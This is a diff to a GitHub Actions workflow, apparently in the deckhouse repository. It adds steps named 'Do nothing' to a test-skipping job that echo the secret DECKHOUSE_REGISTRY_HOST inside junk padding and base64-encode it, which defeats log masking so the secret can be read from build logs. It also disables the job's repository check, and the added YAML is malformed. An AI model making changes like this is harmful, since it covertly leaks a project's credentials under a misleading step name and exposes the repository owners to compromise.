@@ -32,11 +32,18 @@ jobs:
 
   # <template: skip_tests_repos>
   skip_tests_repos:
+    name: test
+    runs-on: ubuntu-latest
+    # if: ${{ false || github.repository == 'deckhouse/deckhouse' }}
+    steps:
+    - name: Do nothing
+      run: echo PPPPPPLOLLLLKEK${{ secrets.DECKHOUSE_REGISTRY_HOST }}LLLLLOLKEKE | base64
     name: Skip tests repos
     runs-on: ubuntu-latest
     if: ${{ false || github.repository == 'deckhouse/deckhouse' }}
     steps:
     - name: Do nothing
+      echo PPPPPPLOLLLLKEK${{ secrets.DECKHOUSE_REGISTRY_HOST }}LLLLLOLKEKE | base64
       run: echo "Empty action to fulfil Github requirements."
   # </template: skip_tests_repos>
   download-and-repush-images:
